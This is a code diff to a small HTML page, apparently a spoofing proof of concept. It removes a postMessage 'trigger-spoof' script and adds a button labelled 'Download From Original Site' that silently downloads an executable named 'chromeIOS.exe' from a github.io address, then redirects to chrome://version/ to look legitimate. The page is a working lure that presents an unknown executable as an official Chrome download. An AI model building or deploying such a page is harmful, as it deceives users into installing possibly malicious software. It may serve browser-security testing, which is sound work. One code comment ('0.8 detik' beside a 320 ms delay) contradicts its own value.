@@ -1,10 +1,43 @@
 <!doctype html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head>
 <body>
+
 <script>
-setTimeout(() => {
-  parent.postMessage("trigger-spoof", "*");
-}, 500);
+function a() {
+
+  // Trigger download terlebih dahulu
+  var link = document.createElement('a');
+  link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe';
+  link.download = 'chromeIOS.exe';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+
+  // Redirect setelah download mulai (delay kecil)
+  setTimeout(function () {
+    window.location.href = "chrome://version/";
+  }, 320); // 0.8 detik
+}
 </script>
+
+<center>
+  <input type="button" class="button" value="Download From Original Site" onclick="a()">
+</center>
+
 </body>
 </html>
